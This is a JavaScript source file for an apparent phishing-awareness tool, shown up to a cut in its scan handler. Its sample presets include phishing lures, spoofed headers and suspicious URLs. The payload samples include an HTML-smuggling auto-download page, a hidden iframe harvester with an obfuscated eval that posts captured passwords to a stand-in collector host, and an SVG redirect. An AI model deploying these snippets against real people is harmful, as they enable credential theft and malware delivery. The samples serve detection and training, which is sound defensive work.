/**
 * Phish-Guard - AI & Cognitive Social Engineering Platform
 * ---------------------------------------------------------
 * Multi-Model BYOK Architecture:
 * - Google Gemini (Gemini 1.5 Flash - Free Tier)
 * - OpenAI (GPT-4o-mini)
 * - Local Cognitive & Heuristic Fallback Engine (Zero-Key Offline)
 * - VirusTotal Threat Intelligence Feed
 */
(function () {
    'use strict';

    // ================================================================
    //  STATE (In-Memory Only)
    // ================================================================
    let aiProvider = 'gemini';
    let apiKey     = '';
    let vtKey      = '';
    let lastScanData = null;
    let lastHeaderScanData = null;

    const PROVIDER_META = {
        gemini: {
            label: 'Google Gemini API Key',
            opt: '(Free Tier)',
            hintHtml: 'Free key from <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener">Google AI Studio</a>.'
        },
        openai: {
            label: 'OpenAI API Key',
            opt: '',
            hintHtml: 'Requires a billed OpenAI account (GPT-4o-mini). No key? Use Gemini or the offline heuristic engine.'
        },
        heuristic: {
            label: 'Built-in Heuristic Engine',
            opt: '(No API key required)',
            hintHtml: 'Fully offline cognitive + pattern analysis. No network calls for message analysis.'
        }
    };

    // Simulator State
    let currentSimIndex = 0;
    let simStats = { attempted: 0, correct: 0 };
    let simAnswers = {};

    // Radar State
    let radarCurrentResults = null;
    let radarFilterCategory = 'all';
    let radarSearchQuery = '';

    // ================================================================
    //  SAMPLE PRESETS
    // ================================================================
    const SAMPLES = {
        bank: "ALERT from Chase Fraud Dept: A debit card charge of $842.19 at Walmart Online was attempted on your account. If this was NOT you, immediately verify your identity to prevent permanent account suspension: https://chase-security-verify.xyz/login?session=92841",
        ceo: "Hi, I am currently in an executive board meeting and cannot take calls. I need you to purchase 5x $100 Apple Gift Cards for a VIP client presentation immediately. Scratch the back, take clear photos of the PINs and reply to this email right away. Please handle this discreetly. Thanks, David (CEO)",
        package: "USPS: We attempted delivery of your package #US-98218-99 today, but the address on file was incomplete. Please update your delivery coordinates within 12 hours or the package will be returned to sender: http://192.168.1.104/usps-redelivery.php",
        creds: "IT Helpdesk Notice: Your Microsoft 365 enterprise password expires in 2 hours. Failure to validate credentials will result in immediate revocation of your corporate email and VPN access. Keep your existing password by confirming here: https://login-microsoftonline.account-update.top/auth",
        payroll: "HR Compensation Notice: An unadjusted Q3 performance bonus of $1,450.00 is pending approval for your employee profile. You must review and confirm your direct deposit details before 5:00 PM today to receive disbursement: https://workday-payroll-portal.click/claim-bonus",
        legit: "Hi team,\n\nJust a quick reminder about our Q3 Project Review tomorrow at 2:00 PM in Conference Room B. Please review the attached slide deck in our shared Google Drive folder prior to the call.\n\nBest regards,\nSarah Jenkins\nProject Lead"
    };

    // ================================================================
    //  EMAIL HEADER SAMPLE PRESETS
    // ================================================================
    const HEADER_SAMPLES = {
        spoofedPaypal: `Received: from mail-out-relay.bulletproof-vps.su (unknown [185.220.101.5])
    by mx.destination-corp.com (Postfix) with ESMTPS id 4T3K7h9QvRz
    for <victim@destination-corp.com>; Thu, 10 Sep 2026 14:22:10 +0000
Received-SPF: fail (destination-corp.com: domain of support@paypal.com does not designate 185.220.101.5 as permitted sender) receiver=destination-corp.com; client-ip=185.220.101.5; envelope-from="bounce@scam-relays.ru";
Authentication-Results: destination-corp.com;
    spf=fail (sender IP is 185.220.101.5) smtp.mailfrom=bounce@scam-relays.ru;
    dkim=none (no signature found);
    dmarc=fail (p=reject sp=reject dis=reject) header.from=paypal.com
From: "PayPal Security Dept" <support@paypal.com>
To: <victim@destination-corp.com>
Reply-To: <verify-resolution-center@secure-payment-cases.com>
Return-Path: <bounce@scam-relays.ru>
Subject: URGENT: Your PayPal Account Has Been Suspended - Case #PP-9942
Date: Thu, 10 Sep 2026 14:21:48 +0000
Message-ID: <20260910142148.883921.qmail@bulletproof-vps.su>
X-Originating-IP: [185.220.101.5]
Content-Type: text/html; charset=UTF-8`,

        ceoReplyTo: `Received: from mail-pj1-f54.google.com (mail-pj1-f54.google.com [209.85.216.54])
    by mx.target-enterprise.com (Postfix) with ESMTPS id 8R91K28x
    for <finance-team@target-enterprise.com>; Fri, 11 Sep 2026 09:15:02 -0400
Received-SPF: softfail (target-enterprise.com: transitioning domain does not designate 209.85.216.54 as permitted sender) client-ip=209.85.216.54;
Authentication-Results: target-enterprise.com;
    spf=softfail smtp.mailfrom=ceo@target-enterprise.com;
    dkim=none;
    dmarc=none
From: "David Miller (CEO)" <ceo@target-enterprise.com>
To: <finance-team@target-enterprise.com>
Reply-To: <david.miller.exec.confidential@protonmail.com>
Return-Path: <ceo@target-enterprise.com>
Subject: Quick Task - Confidential Vendor Wire Transfer
Date: Fri, 11 Sep 2026 09:14:30 -0400
Message-ID: <CA+V30_28198fjjkd018274@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8`,

        m365Softfail: `Received: from out-relay-02.cloud-hoster-temp.net ([45.134.22.10])
    by mx.corporate-gateway.net with ESMTP id 9B771A; Wed, 09 Sep 2026 11:02:14 +0200
Received-SPF: softfail (corporate-gateway.net: domain of microsoft.com does not designate 45.134.22.10 as permitted sender) client-ip=45.134.22.10; envelope-from="noreply@vps-unverified.cloud";
Authentication-Results: corporate-gateway.net;
    spf=softfail smtp.mailfrom=noreply@vps-unverified.cloud;
    dkim=fail reason="signature verification failed" header.d=microsoft.com;
    dmarc=fail (p=quarantine) action=quarantine header.from=microsoft.com
From: "Microsoft 365 Cloud Admin" <account-update@microsoft.com>
To: <employee@corporate-gateway.net>
Return-Path: <noreply@vps-unverified.cloud>
Subject: Critical Notice: Microsoft 365 Security Credential Validation Required
Date: Wed, 09 Sep 2026 11:01:45 +0200
Message-ID: <019842.AA.991823@vps-unverified.cloud>`,

        cleanGoogle: `Received: from mail-vs1-f48.google.com (mail-vs1-f48.google.com [209.85.217.48])
    by mx.recipient-domain.com (Postfix) with ESMTPS id 3Z881KL
    for <alex@recipient-domain.com>; Tue, 08 Sep 2026 16:40:11 +0000
Received-SPF: pass (recipient-domain.com: domain of sarah@legit-company.com designates 209.85.217.48 as permitted sender) client-ip=209.85.217.48; envelope-from="sarah@legit-company.com";
Authentication-Results: recipient-domain.com;
    spf=pass smtp.mailfrom=sarah@legit-company.com;
    dkim=pass header.i=@legit-company.com header.s=google;
    dmarc=pass (p=reject sp=reject dis=none) header.from=legit-company.com
DKIM-Signature: v=1; a=rsa-sha256; d=legit-company.com; s=google; bh=w781jk398a...; b=a8Kd991j...
From: "Sarah Jenkins" <sarah@legit-company.com>
To: <alex@recipient-domain.com>
Return-Path: <sarah@legit-company.com>
Subject: Q3 Project Review - Slides and Agenda attached
Date: Tue, 08 Sep 2026 16:39:55 +0000
Message-ID: <CAPO7=X9w2jk1818290@mail.gmail.com>`
    };

    // ================================================================
    //  URL / QUISHING SAMPLE PRESETS
    // ================================================================
    const URL_SAMPLES = {
        punycode: "https://xn--pypal-4ve.com/signin/webapps/mpp/home?country.x=US",
        stackedSubdomains: "https://login.microsoftonline.com.corporate-gateway-auth.cfd/oauth2/authorize?client_id=4345a&response_type=code&prompt=login",
        openRedirect: "https://www.google.com/url?q=https://malicious-credential-harvest.top/auth/verify&source=gmail&ust=1726000000",
        hexIp: "http://0x7f000001/usps/redelivery/confirm.php?tracking=US991823",
        cleanPortal: "https://security.microsoft.com/homepage?tid=72f988bf-86f1-41af-91ab-2d7cd011db47"
    };

    // ================================================================
    //  PAYLOAD & HTML SMUGGLING SAMPLE PRESETS
    // ================================================================
    const PAYLOAD_SAMPLES = {
        smugglingBlob: `<!DOCTYPE html>
<html>
<head><title>Secure Document Viewer</title></head>
<body>
<script>
    // HTML Smuggling / Base64 Blob Assembly (Simulated Qakbot/Nobelium Lure)
    function b64ToBlob(b64Data, contentType) {
        const byteCharacters = atob(b64Data);
        const byteArrays = [];
        for (let i = 0; i < byteCharacters.length; i++) {
            byteArrays.push(byteCharacters.charCodeAt(i));
        }
        return new Blob([new Uint8Array(byteArrays)], {type: contentType});
    }
    const maliciousPayloadB64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA=";
    const blob = b64ToBlob(maliciousPayloadB64, 'application/octet-stream');
    const link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    link.download = 'Encrypted_Invoice_Q3.iso';
    document.body.appendChild(link);
    link.click();
</script>
<h3>Loading your protected document from cloud vault...</h3>
</body>
</html>`,

        iframeLogin: `<!DOCTYPE html>
<html>
<head><title>Microsoft 365 Cloud Document Access</title></head>
<body style="margin:0; padding:0;">
<iframe src="https://login-microsoftonline.account-update.top/auth/embed?redirect=token" style="position:fixed; top:0; left:0; width:100vw; height:100vh; border:none;"></iframe>
<form id="harvestForm" action="https://malicious-collector.top/api/steal" method="POST" style="display:none;">
    <input type="hidden" name="user_token" id="tokenField">
</form>
<script>
    window.addEventListener('message', function(e) {
        if (e.data && e.data.password) {
            eval(unescape('%66%65%74%63%68%28%27%68%74%74%70%73%3A%2F%2F%6D%61%6C%69%63%69%6F%75%73%2D%63%6F%6C%6C%65%63%74%6F%72%2E%74%6F%70%2F%61%70%69%2F%73%74%65%61%6C%27%2C%20%7B%6D%65%74%68%6F%64%3A%27%50%4F%53%54%27%2C%20%62%6F%64%79%3A%4A%53%4F%4E%2E%73%74%72%69%6E%67%69%66%79%28%65%2E%64%61%74%61%29%7D%29'));
        }
    });
</script>
</body>
</html>`,

        svgScript: `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="600" viewBox="0 0 800 600">
  <rect width="800" height="600" fill="#0f172a"/>
  <text x="50%" y="45%" fill="#38bdf8" font-size="22" font-family="sans-serif" text-anchor="middle">Click below to open confidential NDA attachment</text>
  <script type="text/javascript">
    <![CDATA[
      // Malicious SVG Injected Redirection Routine
      setTimeout(function() {
        window.location.replace("https://login-chase-security-verify.xyz/oauth/login?session=active");
      }, 500);
    ]]>
  </script>
</svg>`,

        doubleExt: `<!DOCTYPE html>
<html>
<body>
<h2>Corporate Payroll & Benefits Portal</h2>
<p>Please download and sign your annual compensation adjustment letter:</p>
<ul>
  <li><a href="https://vps-payload-distribution.cfd/files/Compensation_Review_2026.pdf.exe" download>Download Compensation_Review_2026.pdf.exe (PDF Document)</a></li>
  <li><a href="https://vps-payload-distribution.cfd/files/Q3_Tax_Exemption_Form.xlsx.vbs" download>Download Q3_Tax_Exemption_Form.xlsx.vbs</a></li>
</ul>
</body>
</html>`,

        cleanReceipt: `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #333; }
  .receipt-box { max-width: 600px; margin: 20px auto; border: 1px solid #e2e8f0; padding: 24px; border-radius: 8px; }
  .total { font-size: 1.2rem; font-weight: bold; color: #0f172a; margin-top: 16px; }
</style>
</head>
<body>
<div class="receipt-box">
  <h2>Your Order Receipt #PG-882194</h2>
  <p>Thank you for your purchase with CloudServices Inc. Your monthly subscription has renewed successfully.</p>
  <table style="width:100%; border-collapse: collapse;">
    <tr><td>Standard Cloud Workspace (1 Month)</td><td style="text-align:right;">$15.00</td></tr>
    <tr><td>Applied Tax</td><td style="text-align:right;">$1.20</td></tr>
  </table>
  <div class="total">Total Charged: $16.20</div>
  <p style="font-size:0.85rem; color:#64748b; margin-top:16px;">Questions? Visit <a href="https://support.cloudservices-official.com">our official help center</a>.</p>
</div>
</body>
</html>`
    };

    // ================================================================
    //  SIMULATOR SCENARIOS
    // ================================================================
    const SIM_SCENARIOS = [
        {
            category: "Executive Whaling (BEC)",
            difficulty: "Intermediate",
            diffClass: "diff-med",
            from: "David Miller <david.miller.ceo@corp-executive-mail.com>",
            subject: "URGENT: Confidential Client Gift Cards Request",
            body: "Hi,\n\nI'm tied up in confidential merger negotiations and cannot take calls. I need an urgent favor—please purchase 4x $200 Apple Gift Cards for our prospective partners right now.\n\nScratch the security film on the back, take crisp photos of the PIN codes, and email them back to me directly. I will authorize your expense reimbursement first thing tomorrow morning.\n\nPlease handle this discreetly and quickly.\n\nBest,\nDavid Miller\nChief Executive Officer",
            isPhish: true,
            title: "Classic Business Email Compromise (BEC)",
            explanation: "This is a textbook Executive Whaling attack using a lookalike external domain ('@corp-executive-mail.com') to spoof the CEO.",
            cognitiveBiases: [
                "Manufactured Authority (CEO title overrides verification)",
                "Artificial Urgency ('right now', 'tied up in negotiations')",
                "Isolation / Secrecy ('handle this discreetly', 'cannot take calls')"
            ],
            indicators: [
                "Unusual payment method (untraceable gift cards)",
                "Mismatched external sender domain pretending to be internal leadership",
                "Pressure to bypass normal financial procurement controls"
            ],
            coaching: "Never purchase gift cards or execute financial transactions based solely on email requests. Always verify out-of-band via phone or Slack."
        },
        {
            category: "Financial Smishing / Brand Spoofing",
            difficulty: "Easy",
            diffClass: "diff-easy",
            from: "Chase Alert Service <alerts@chase-security-verify.xyz>",
            subject: "URGENT FRAUD ALERT: Unauthorized Debit Transaction $842.19",
            body: "CHASE SECURITY NOTIFICATION:\n\nWe detected an unauthorized charge of $842.19 at Walmart.com on your card ending in 4108.\n\nTo reverse this charge and prevent permanent suspension of all banking privileges, you must verify your identity immediately at:\nhttps://chase-security-verify.xyz/auth?id=88319\n\nFailure to respond within 1 hour will result in card cancellation.",
            isPhish: true,
            title: "Urgent Financial Coercion Scam",
            explanation: "The attacker exploits high-stress panic by inventing a large unauthorized charge to force a rushed click on a phishing domain.",
            cognitiveBiases: [
                "Fear & Panic (threat of losing $842.19 and account suspension)",
                "High Urgency ('within 1 hour', 'immediately')",
                "False Authority (impersonating bank fraud department)"
            ],
            indicators: [
                "Suspicious TLD (.xyz) completely unrelated to legitimate chase.com",
                "Coercive deadline intended to short-circuit critical thinking",
                "Generic greeting without actual account holder name"
            ],
            coaching: "Legitimate banks never threaten immediate permanent account closure within 1 hour or ask you to verify credentials on .xyz domains."
        },
        {
            category: "Credential Harvester (M365)",
            difficulty: "Intermediate",
            diffClass: "diff-med",
            from: "IT Helpdesk <support@login-microsoftonline.account-update.top>",
            subject: "Action Required: Microsoft 365 Password Expiry Warning",
            body: "Attention Corporate User:\n\nYour Microsoft 365 enterprise password will expire in 2 hours. Once expired, you will be locked out of Outlook, Teams, and VPN services.\n\nIf you wish to retain your current password without disruption, confirm your identity here:\nhttps://login-microsoftonline.account-update.top/sso-login\n\nIT Operations & Security Team",
            isPhish: true,
            title: "Corporate SSO Credential Harvest",
            explanation: "The email impersonates internal IT support to steal corporate Single Sign-On (SSO) login credentials.",
            cognitiveBiases: [
                "Loss Aversion (fear of losing workflow and VPN access)",
                "Convenience Trap ('Keep your current password')",
                "Institutional Authority ('IT Operations & Security')"
            ],
            indicators: [
                "Domain spoofing: '.account-update.top' is the actual domain, with 'login-microsoftonline' merely a subdomain",
                "High-risk top-level domain (.top)",
                "Policy contradiction: Real IT departments never let you bypass password expiry rules by 'confirming' old passwords"
            ],
            coaching: "Always inspect the root domain before entering credentials. Legitimate Microsoft logins reside on microsoftonline.com."
        },
        {
            category: "Financial Lure (HR Payroll)",
            difficulty: "Advanced",
            diffClass: "diff-hard",
            from: "HR Benefits Notification <payroll@workday-payroll-portal.click>",
            subject: "Notification: Unclaimed Q3 Discretionary Bonus Allocation ($1,450.00)",
            body: "Dear Colleague,\n\nYou have a pending performance bonus payout of $1,450.00 that has not been claimed due to outdated bank routing details.\n\nPlease confirm your direct deposit details before 5:00 PM today to ensure inclusion in this week's direct deposit cycle:\nhttps://workday-payroll-portal.click/claim-bonus\n\nHuman Resources & Total Rewards",
            isPhish: true,
            title: "HR Compensation Baiting Attack",
            explanation: "Attackers use positive emotional stimuli (unexpected bonus) paired with a tight deadline to bait employees into surrendering banking details.",
            cognitiveBiases: [
                "Greed / Excitement (unexpected financial reward)",
                "Loss Aversion (fear of missing out on $1,450 by 5:00 PM deadline)",
                "Corporate Authority (HR & Total Rewards)"
            ],
            indicators: [
                "Fake HR domain (.click) spoofing Workday",
                "Asking for sensitive banking credentials via an external web link",
                "Artificial 5:00 PM deadline to discourage verifying with real HR"
            ],
            coaching: "Never click external links to enter banking details. Navigate to your corporate HR/Workday portal independently."
        },
        {
            category: "MFA Fatigue / Push Authorization",
            difficulty: "Advanced",
            diffClass: "diff-hard",
            from: "Duo Security Alerts <no-reply@duo-security-mfa-verify.net>",
            subject: "Security Alert: New Sign-in Attempt from St. Petersburg, Russia",
            body: "Duo Two-Factor Authentication:\n\nA login attempt was detected from IP 185.220.101.5 (St. Petersburg, Russia) for your workstation profile.\n\nIf this was NOT you, tap below immediately to reject the request and secure your token:\nhttps://duo-security-mfa-verify.net/revoke-session\n\nDuo Security Protection System",
            isPhish: true,
            title: "MFA Token Revocation Phish",
            explanation: "Capitalizes on alarm over a foreign sign-in to trick users into visiting a fake portal where their actual MFA token is stolen.",
            cognitiveBiases: [
                "Fear of Foreign Intrusion ('St. Petersburg, Russia')",
                "Urgent Defensive Reaction (rushing to 'block' the attacker)",
                "Technical Authority (Duo Security)"
            ],
            indicators: [
                "Fake vendor domain: duo-security-mfa-verify.net instead of official duosecurity.com",
                "Reverse psychology: Posing as a defensive security alert to execute an attack"
            ],
            coaching: "When receiving unexpected MFA alerts, open your official authenticator app or contact your IT helpdesk directly."
        },
        {
            category: "Legitimate Corporate Communication",
            difficulty: "Easy",
            diffClass: "diff-easy",
            from: "Sarah Jenkins <sjenkins@acmecorp.com>",
            subject: "Reminder: Q3 Project Review Tomorrow at 2:00 PM",
            body: "Hi team,\n\nJust a quick reminder about our Q3 Project Review meeting scheduled for tomorrow at 2:00 PM in Conference Room B / Google Meet.\n\nPlease review the summary deck in our corporate Google Drive folder prior to the call so we can focus our time on Q4 milestones.\n\nMeeting Link: https://meet.google.com/abc-defg-hij\n\nBest regards,\nSarah Jenkins\nSenior Project Manager\nAcme Corp",
            isPhish: false,
            title: "Legitimate Workplace Communication",
            explanation: "This is a routine, non-threatening internal meeting reminder with no coercive emotional manipulation or deceptive indicators.",
            cognitiveBiases: [
                "No artificial panic or aggressive countdowns",
                "Reasonable business context and polite professional tone"
            ],
            indicators: [
                "Valid corporate sender address (@acmecorp.com)",
                "Legitimate Google Meet conferencing domain (meet.google.com)",
                "No requests for credentials, passwords, gift cards, or urgent financial changes"
            ],
            coaching: "Notice the absence of false urgency, suspicious domain mismatches, or requests for sensitive information."
        }
    ];

    // ================================================================
    //  DOM REFERENCES
    // ================================================================
    const $ = (sel) => document.querySelector(sel);
    const $$ = (sel) => document.querySelectorAll(sel);

    const dom = {
        keyToggle:        $('#keyToggle'),
        keyPanel:         $('#keyPanel'),
        aiProviderSelect: $('#aiProvider'),
        apiKeyLabel:      $('#apiKeyLabel'),
        apiKeyHint:       $('#apiKeyHint'),
        apiKeyInput:      $('#apiKeyInput'),
        vtInput:          $('#vtKey'),
        messageInput:     $('#messageInput'),
        scanButton:       $('#scanButton'),
        clearBtn:         $('#clearBtn'),
        loading:          $('#loading'),
        statusText:       $('#statusText'),
        resultArea:       $('#resultArea'),
        sampleBtns:       $$('.btn-sample:not(.btn-header-sample)'),

        // -- Email Header & Authentication Inspector --
        headerInput:      $('#headerInput'),
        analyzeHeaderBtn: $('#analyzeHeaderBtn'),
        clearHeaderBtn:   $('#clearHeaderBtn'),
        headerLoading:    $('#headerLoading'),
        headerStatusText: $('#headerStatusText'),
        headerResultArea: $('#headerResultArea'),
        headerSampleBtns: $$('.btn-header-sample'),

        // -- Simulator (Security Awareness Lab) --
        simCurrentIndex:       $('#simCurrentIndex'),
        simScore:              $('#simScore'),
        simScoreRatio:         $('#simScoreRatio'),
        simScenarioCategory:   $('#simScenarioCategory'),
        simScenarioDifficulty: $('#simScenarioDifficulty'),
        simFrom:               $('#simFrom'),
        simSubject:            $('#simSubject'),
        simBody:               $('#simBody'),
        simDecisionArea:       $('#simDecisionArea'),
        simFeedbackArea:       $('#simFeedbackArea'),
        btnJudgePhish:         $('#btnJudgePhish'),
        btnJudgeSafe:          $('#btnJudgeSafe'),
        btnPrevSim:            $('#btnPrevSim'),
        btnNextSim:            $('#btnNextSim'),
        btnGenerateChallenge:  $('#btnGenerateChallenge'),
        btnResetSimulator:     $('#btnResetSimulator'),

        // -- QR & Deep URL Sandbox --
        urlInput:              $('#urlInput'),
        analyzeUrlBtn:         $('#analyzeUrlBtn'),
        clearUrlBtn:           $('#clearUrlBtn'),
        urlLoading:            $('#urlLoading'),
        urlStatusText:         $('#urlStatusText'),
        urlResultArea:         $('#urlResultArea'),
        urlSampleBtns:         $$('.btn-url-sample'),
        qrDropZone:            $('#qrDropZone'),
        qrFileInput:           $('#qrFileInput'),
        qrPreviewArea:         $('#qrPreviewArea'),
        qrPreviewImg:          $('#qrPreviewImg'),
        qrDecodedPayload:      $('#qrDecodedPayload'),
        qrDropPrompt:          $('#qrDropPrompt'),

        // -- Brand Lookalike & Typosquat Radar --
        radarDomainInput:      $('#radarDomainInput'),
        btnGenerateRadar:      $('#btnGenerateRadar'),
        btnAiDefenseAdvice:    $('#btnAiDefenseAdvice'),
        clearRadarBtn:         $('#clearRadarBtn'),
        radarLoading:          $('#radarLoading'),
        radarStatusText:       $('#radarStatusText'),
        radarResultArea:       $('#radarResultArea'),
        radarPresetBtns:       $$('.btn-radar-preset'),

        // -- Payload & HTML Smuggling Inspector --
        payloadInput:          $('#payloadInput'),
        analyzePayloadBtn:     $('#analyzePayloadBtn'),
        clearPayloadBtn:       $('#clearPayloadBtn'),
        payloadLoading:        $('#payloadLoading'),
        payloadStatusText:     $('#payloadStatusText'),
        payloadResultArea:     $('#payloadResultArea'),
        payloadSampleBtns:     $$('.btn-payload-sample'),
        payloadDropZone:       $('#payloadDropZone'),
        payloadFileInput:      $('#payloadFileInput'),
        payloadDropPrompt:     $('#payloadDropPrompt'),
    };

    // ================================================================
    //  INIT - Event Listeners
    // ================================================================
    dom.keyToggle.addEventListener('click', toggleKeyPanel);
    dom.aiProviderSelect.addEventListener('change', onProviderChange);
    dom.apiKeyInput.addEventListener('input', (e) => { apiKey = e.target.value.trim(); });
    dom.vtInput.addEventListener('input',     (e) => { vtKey  = e.target.value.trim(); });
    dom.scanButton.addEventListener('click',  handleScan);

    if (dom.clearBtn) {
        dom.clearBtn.addEventListener('click', () => {
            dom.messageInput.value = '';
            clearResults();
            dom.messageInput.focus();
        });
    }

    // Wire sample buttons
    dom.sampleBtns.forEach((btn) => {
        btn.addEventListener('click', () => {
            const key = btn.dataset.sample;
            if (SAMPLES[key]) {
                dom.messageInput.value = SAMPLES[key];
                clearResults();
                dom.messageInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        });
    });

    // Wire email header sample buttons & actions
    if (dom.analyzeHeaderBtn) {
        dom.analyzeHeaderBtn.addEventListener('click', handleHeaderScan);
    }
    if (dom.clearHeaderBtn) {
        dom.clearHeaderBtn.addEventListener('click', () => {
            if (dom.headerInput) dom.headerInput.value = '';
            clearHeaderResults();
            if (dom.headerInput) dom.headerInput.focus();
        });
    }
    dom.headerSampleBtns.forEach((btn) => {
        btn.addEventListener('click', () => {
            const key = btn.dataset.sample;
            if (HEADER_SAMPLES[key] && dom.headerInput) {
                dom.headerInput.value = HEADER_SAMPLES[key];
                clearHeaderResults();
                dom.headerInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        });
    });

    // Wire URL / Quishing events & presets
    if (dom.analyzeUrlBtn) {
        dom.analyzeUrlBtn.addEventListener('click', handleUrlScan);
    }
    if (dom.clearUrlBtn) {
        dom.clearUrlBtn.addEventListener('click', () => {
            if (dom.urlInput) dom.urlInput.value = '';
            if (dom.qrPreviewArea) dom.qrPreviewArea.classList.add('hidden');
            if (dom.qrDropPrompt) dom.qrDropPrompt.classList.remove('hidden');
            clearUrlResults();
            if (dom.urlInput) dom.urlInput.focus();
        });
    }
    dom.urlSampleBtns.forEach((btn) => {
        btn.addEventListener('click', () => {
            const key = btn.dataset.sample;
            if (URL_SAMPLES[key] && dom.urlInput) {
                dom.urlInput.value = URL_SAMPLES[key];
                clearUrlResults();
                dom.urlInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                handleUrlScan();
            }
        });
    });

    // Initialize QR Drag/Drop & File Input
    initQrScanner();

    // Initialize tabs & simulator
    initTabs();
    initSimulator();

    // Wire simulator action buttons
    if (dom.btnGenerateChallenge) {
        dom.btnGenerateChallenge.addEventListener('click', generateAIScenario);
    }
    if (dom.btnResetSimulator) {
        dom.btnResetSimulator.addEventListener('click', resetSimulator);
    }

    // Wire Radar actions & preset buttons
    if (dom.btnGenerateRadar) {
        dom.btnGenerateRadar.addEventListener('click', handleRadarGenerate);
    }
    if (dom.btnAiDefenseAdvice) {
        dom.btnAiDefenseAdvice.addEventListener('click', handleRadarAiDefense);
    }
    if (dom.clearRadarBtn) {
        dom.clearRadarBtn.addEventListener('click', () => {
            dom.radarDomainInput.value = '';
            if (dom.radarResultArea) dom.radarResultArea.innerHTML = '';
            radarCurrentResults = null;
        });
    }
    if (dom.radarDomainInput) {
        dom.radarDomainInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handleRadarGenerate();
        });
    }
    if (dom.radarPresetBtns) {
        dom.radarPresetBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                const brand = btn.dataset.brand;
                if (brand && dom.radarDomainInput) {
                    dom.radarDomainInput.value = brand;
                    handleRadarGenerate();
                }
            });
        });
    }
    // Wire Payload & HTML Smuggling actions & preset buttons
    if (dom.analyzePayloadBtn) {
        dom.analyzePayloadBtn.addEventListener('click', handlePayloadScan);
    }
    if (dom.clearPayloadBtn) {
        dom.clearPayloadBtn.addEventListener('click', () => {
            if (dom.payloadInput) dom.payloadInput.value = '';
            if (dom.payloadResultArea) dom.payloadResultArea.innerHTML = '';
        });
    }
    if (dom.payloadSampleBtns) {
        dom.payloadSampleBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                const key = btn.dataset.payload;
                if (PAYLOAD_SAMPLES[key] && dom.payloadInput) {
                    dom.payloadInput.value = PAYLOAD_SAMPLES[key];
                    if (dom.payloadResultArea) dom.payloadResultArea.innerHTML = '';
                    dom.payloadInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    handlePayloadScan();
                }
            });
        });
    }
    initPayloadFileDrop();


    // Sync provider UI on load
    onProviderChange();

    // Wipe keys on unload
    window.addEventListener('beforeunload', () => {
        apiKey = '';
        vtKey  = '';
    });

    // ================================================================
    //  UI HELPERS
    // ================================================================
    function toggleKeyPanel() {
        const isCollapsed = dom.keyPanel.classList.toggle('collapsed');
        dom.keyToggle.setAttribute('aria-expanded', !isCollapsed);
    }

    function initTabs() {
        const tabs = $$('.tab-btn');
        tabs.forEach((btn) => {
            btn.addEventListener('click', () => {
                tabs.forEach((b) => b.classList.remove('active'));
                btn.classList.add('active');
                $$('.tab-content').forEach((c) => c.classList.remove('active'));
                const target = document.getElementById(btn.dataset.tab);
                if (target) target.classList.add('active');
            });
        });
    }

    function onProviderChange() {
        aiProvider = dom.aiProviderSelect.value;
        const meta = PROVIDER_META[aiProvider] || PROVIDER_META.gemini;
        dom.apiKeyInput.disabled = (aiProvider === 'heuristic');
        dom.apiKeyLabel.innerHTML = escapeHtml(meta.label) +
            (meta.opt ? ' <span class="opt">' + escapeHtml(meta.opt) + '</span>' : '');
        dom.apiKeyHint.innerHTML = meta.hintHtml;
    }

    function setLoading(on) {
        dom.scanButton.disabled = on;
        dom.loading.classList.toggle('hidden', !on);
    }

    function setStatus(msg) {
        dom.statusText.textContent = msg;
    }

    function clearResults() {
        dom.resultArea.innerHTML = '';
        lastScanData = null;
    }

    function showError(msg) {
        dom.resultArea.innerHTML =
            '<div class="error-box">' + escapeHtml(msg) + '</div>';
    }

    function escapeHtml(str) {
        if (str === null || str === undefined) return '';
        const d = document.createElement('div');
        d.textContent = String(str);
        return d.innerHTML;
    }

    // ================================================================
    //  MAIN SCAN HANDLER
    // ================================================================
    async function handleScan() {
        const message = dom.messageInput.value.trim();
        if (!message) return showError('Please paste a message or select a Quick Test Sample above.');

        setLoading(true);
        clearResults();

        try {
            // 1 - Extract URLs
            setStatus('Extracting URLs & network indicators...');
            const urls = extractURLs(message);

            // 2 - VirusTotal Scan (optional)
            let vtResults = null;
            if (vtKey && urls.length > 0) {
                setStatus('Querying VirusTotal threat intelligence...');
                vtResults = await scanURLsWithVirusTotal(urls, vtKey);
            }

            // 3 - Engine Selection: Gemini / OpenAI / Heuristic
            let analysis = null;
            let engineUsed = '';

            if (aiProvider !== 'heuristic' && !apiKey) {
                throw new Error('An API key is required for the ' +
                    (aiProvider === 'gemini' ? 'Gemini' : 'OpenAI') +
                    ' engine. Enter your key above, or switch to the Built-in Heuristic Engine.');
            }

            if (aiProvider === 'gemini' && apiKey) {
                setStatus('Running Google Gemini 1.5 Flash neural + psych analysis...');
                analysis = await analyzeWithGemini(message, urls, apiKey);
                engineUsed = 'AI (Gemini 1.5 Flash)';
            } else if (aiProvider === 'openai' && apiKey) {
                setStatus('Running OpenAI GPT-4o-mini neural analysis...');
                analysis = await analyzeWithOpenAI(message, urls, apiKey);
                engineUsed = 'AI (GPT-4o-mini)';
            } else {
                setStatus('Running built-in Heuristic + Cognitive Analysis Engine...');
                await new Promise(r => setTimeout(r, 450));
                analysis = analyzeHeuristics(message, urls);
                engineUsed = 'Local Heuristic Engine';
            }

            // Ensure results always include psych + plain-English layers
            analysis = normalizeAnalysis(analysis, message, urls);

            // 4 - If VirusTotal detected malware, adjust overall score
            if (vtResults && vtResults.some(r => r.malicious > 0)) {
